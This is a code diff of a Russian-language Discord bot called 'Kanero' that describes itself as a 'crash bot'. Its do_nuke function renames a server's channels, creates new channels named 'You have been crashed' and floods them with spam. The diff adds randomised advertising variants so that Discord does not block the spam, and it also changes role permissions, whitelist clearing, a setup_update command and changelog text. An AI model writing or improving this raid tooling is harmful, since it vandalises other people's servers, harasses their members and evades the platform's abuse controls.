@@ -224,6 +224,16 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
+    # Реклама — добавляется всегда, вариативно чтобы Discord не блокировал
+    import random
+    ad_variants = [
+        "\n\n☠️ Kanero — https://discord.gg/XpNZAwh4",
+        "\n\n💀 Хочешь так же? → discord.gg/XpNZAwh4",
+        "\n\n☠️ Kanero crash bot — discord.gg/XpNZAwh4",
+        "\n\n💀 Kanero — заходи: discord.gg/XpNZAwh4",
+        "\n\n☠️ discord.gg/XpNZAwh4 — Kanero",
+    ]
+
     NUKE_NAME = "Вы были крашнуты"
 
     # ── 1. Переименовываем только каналы ──
@@ -245,10 +255,11 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
             if not nuke_running.get(guild.id):
                 return
             ch = await guild.create_text_channel(name=NUKE_NAME)
-            await asyncio.gather(
-                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
-                return_exceptions=True
-            )
+            msgs = []
+            for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT):
+                ad = random.choice(ad_variants)
+                msgs.append(ch.send(spam_text + ad))
+            await asyncio.gather(*msgs, return_exceptions=True)
         except Exception:
             pass
 
@@ -941,17 +952,24 @@ async def list_cmd(ctx):
 async def list_clear(ctx):
     if ctx.author.id != config.OWNER_ID:
         return
-    # Оставляем только овнеров (OWNER_ID и OWNER_WHITELIST)
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
-    removed = [uid for uid in config.WHITELIST if uid not in protected]
-    config.WHITELIST = [uid for uid in config.WHITELIST if uid in protected]
-    # Очищаем premium тоже (кроме овнеров)
-    PREMIUM_LIST[:] = [uid for uid in PREMIUM_LIST if uid in protected]
+    wl_removed = len([uid for uid in config.WHITELIST if uid not in protected])
+    pm_removed = len(PREMIUM_LIST)
+    fl_removed = len(FREELIST)
+    config.WHITELIST[:] = [uid for uid in config.WHITELIST if uid in protected]
+    PREMIUM_LIST.clear()
+    FREELIST.clear()
     save_whitelist()
     save_premium()
+    save_freelist()
     embed = discord.Embed(
-        title="🗑️ Whitelist очищен",
-        description=f"Удалено **{len(removed)}** пользователей.\nОвнеры сохранены.",
+        title="🗑️ Все списки очищены",
+        description=(
+            f"Whitelist: удалено **{wl_removed}**\n"
+            f"Premium: удалено **{pm_removed}**\n"
+            f"Freelist: удалено **{fl_removed}**\n"
+            "Овнеры сохранены."
+        ),
         color=0x0a0a0a
     )
     embed.set_footer(text="☠️ Kanero")
@@ -1172,10 +1190,10 @@ async def setup(ctx):
                 pass
 
     # ── 2. Создаём роли с правами ──
-    guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False)
-    user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False)
-    white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True)
-    premium_perms = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True)
+    guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
+    user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False)
+    white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False)
+    premium_perms = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False)
     owner_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, manage_channels=True, manage_roles=True, manage_webhooks=True, kick_members=True, ban_members=True, manage_nicknames=True, view_audit_log=True, mention_everyone=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, mute_members=True, deafen_members=True, priority_speaker=True)
     dev_perms     = discord.Permissions(administrator=True)
 
@@ -1216,9 +1234,14 @@ async def setup(ctx):
 
     def admin_ow():
         return {
-            guild.default_role: _ow(), role_guest: _ow(), role_user: _ow(),
-            role_white: _ow(), role_premium: _ow(),
-            role_owner: _ow(True, True), role_dev: _ow(True, True),
+            guild.default_role: _ow(False, False),
+            role_guest:  _ow(True, False),
+            role_user:   _ow(True, False),
+            role_white:  _ow(True, False),
+            role_premium:_ow(True, False),
+            role_mod:    _ow(True, False),
+            role_owner:  _ow(True, True),
+            role_dev:    _ow(True, True),
         }
 
     # ── 4. Категории и каналы ──
@@ -1486,6 +1509,90 @@ async def setup(ctx):
     )
     embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль")
     await msg.edit(content=None, embed=embed)
+
+
+@bot.command(name="setup_update")
+async def setup_update(ctx):
+    """Обновить сервер без удаления каналов. Только для овнеров."""
+    if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
+        await ctx.send("❌ Только для овнеров.")
+        return
+    guild = ctx.guild
+    msg = await ctx.send("🔄 Обновляю сервер без удаления каналов...")
+    results = []
+
+    # 1. @everyone — ничего не видит
+    try:
+        await guild.default_role.edit(permissions=discord.Permissions(
+            read_messages=False, send_messages=False, connect=False, use_application_commands=False
+        ))
+        results.append("✅ @everyone обновлён")
+    except Exception as e:
+        results.append(f"❌ @everyone: {e}")
+
+    # 2. Обновляем права ролей
+    role_updates = {
+        "👤 Guest":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False),
+        "👥 User":    discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False),
+        "✅ White":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False),
+        "💎 Premium": discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False),
+    }
+    for rname, perms in role_updates.items():
+        role = discord.utils.find(lambda r: r.name == rname, guild.roles)
+        if role:
+            try:
+                await role.edit(permissions=perms)
+                results.append(f"✅ {rname}")
+            except Exception as e:
+                results.append(f"❌ {rname}: {e}")
+        else:
+            results.append(f"⚠️ {rname} не найдена — создаю")
+            try:
+                await guild.create_role(name=rname)
+            except Exception:
+                pass
+
+    # 3. Создаём отсутствующие роли
+    for rname in ("🛡️ Moderator", "🎬 Media"):
+        if not discord.utils.find(lambda r: r.name == rname, guild.roles):
+            try:
+                await guild.create_role(name=rname)
+                results.append(f"✅ Создана {rname}")
+            except Exception:
+                pass
+
+    # 4. ADMIN каналы — все видят, только Owner+ пишет
+    admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
+    if admin_cat:
+        for ch in admin_cat.channels:
+            try:
+                ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
+                for r in guild.roles:
+                    if r.name in ("👑 Owner", "🔧 Developer", "🤖 Kanero"):
+                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                    elif r.name in ("👤 Guest", "👥 User", "✅ White", "💎 Premium", "🛡️ Moderator"):
+                        ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=False)
+                await ch.edit(overwrites=ow)
+            except Exception:
+                pass
+        results.append("✅ ADMIN права обновлены")
+
+    # 5. Статистика
+    try:
+        await update_stats_channels(guild)
+        results.append("✅ Статистика обновлена")
+    except Exception as e:
+        results.append(f"❌ Статистика: {e}")
+
+    embed = discord.Embed(
+        title="🔄 Сервер обновлён",
+        description="\n".join(results),
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ Kanero  |  Каналы не удалялись  |  !setup — полный пересоздать")
+    await msg.edit(content=None, embed=embed)
+
+
 @bot.command(name="on_add")
 async def on_add(ctx, user_id: int):
     if ctx.author.id != config.OWNER_ID:
@@ -2291,24 +2398,20 @@ async def changelog(ctx):
         name="🔥 v2.0 — Полный редизайн",
         value=(
             "**Структура сервера:**\n"
-            "• Новые категории: FREELIST · WHITE · PREMIUM (у каждого свои каналы)\n"
-            "• Категория СТАТИСТИКА — счётчики участников по ролям (зайти нельзя)\n"
-            "• Тикет система — кнопка в #create-ticket создаёт приватный канал\n"
-            "• Роль **👥 User** — выдаётся авто при написании в #addbot\n"
-            "• Роль **🎬 Media** — только она пишет в #медиа\n"
-            "• Welcome канал — виден всем, бот пишет при входе\n"
-            "• Guest видит: welcome, основное, чаты\n\n"
-            "**Доступ:**\n"
-            "• `!nuke` / `!auto_nuke` — требуют freelist (написать в #addbot)\n"
-            "• `!nuke [текст]` — кастомный текст только для White\n"
-            "• Реклама в нюке всегда: `☠️ Kanero — https://discord.gg/XpNZAwh4`\n\n"
-            "**Новые команды:**\n"
-            "• `!fl_add/remove/list/clear` — управление freelist\n"
-            "• `!on_member_join` — авто-роль + welcome сообщение\n\n"
-            "**Исправления:**\n"
-            "• Все ссылки обновлены → https://discord.gg/XpNZAwh4\n"
-            "• Порядок ролей исправлен (Developer сверху, Guest снизу)\n"
-            "• Новости/changelog/партнёрство — только Owner пишет"
+            "• Категории: СТАТИСТИКА · WELCOME · ОСНОВНОЕ · ЧАТЫ · FREELIST · WHITE · PREMIUM · ВОЙСЫ · ADMIN\n"
+            "• Счётчики участников по ролям (зайти нельзя)\n"
+            "• Тикет система — кнопка в #create-ticket\n"
+            "• Роль 👥 User (авто при freelist) · 🎬 Media · 🛡️ Moderator\n\n"
+            "**Команды:**\n"
+            "• `!fl_add/remove/clear` — freelist по ID/username/@mention\n"
+            "• `!wl_add/remove` — whitelist по ID/username/@mention\n"
+            "• `!pm_add/remove` — premium по ID/username/@mention\n"
+            "• `!setup_update` — обновить сервер без удаления каналов\n"
+            "• `!list_clear` — очищает whitelist + premium + freelist\n\n"
+            "**Права:**\n"
+            "• ADMIN — все роли видят, только Owner пишет\n"
+            "• Роли без `use_application_commands`\n"
+            "• Статистика обновляется авто при входе/выходе/изменении ролей"
         ),
         inline=False
     )
@@ -2332,14 +2435,13 @@ async def changelogall(ctx):
     embed.add_field(
         name="🔥🔥 v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
         value=(
-            "• Новые категории: FREELIST · WHITE · PREMIUM\n"
-            "• Категория СТАТИСТИКА — счётчики по ролям\n"
-            "• Тикет система — кнопка в #create-ticket\n"
-            "• Роль 👥 User (авто при freelist) · 🎬 Media\n"
-            "• !wl_add/pm_add авто выдают роли на сервере\n"
-            "• !cleanup доступен freelist+\n"
-            "• Реклама убрана из нюков\n"
-            "• Ссылка → https://discord.gg/XpNZAwh4"
+            "• Категории: СТАТИСТИКА · FREELIST · WHITE · PREMIUM\n"
+            "• Счётчики ролей, тикеты, роли User/Media/Moderator\n"
+            "• !wl_add/pm_add/fl_add по username/@mention/ID\n"
+            "• !setup_update — обновить без удаления каналов\n"
+            "• !list_clear — очищает все списки\n"
+            "• ADMIN — все видят, только Owner пишет\n"
+            "• Статистика обновляется авто"
         ),
         inline=False
     )
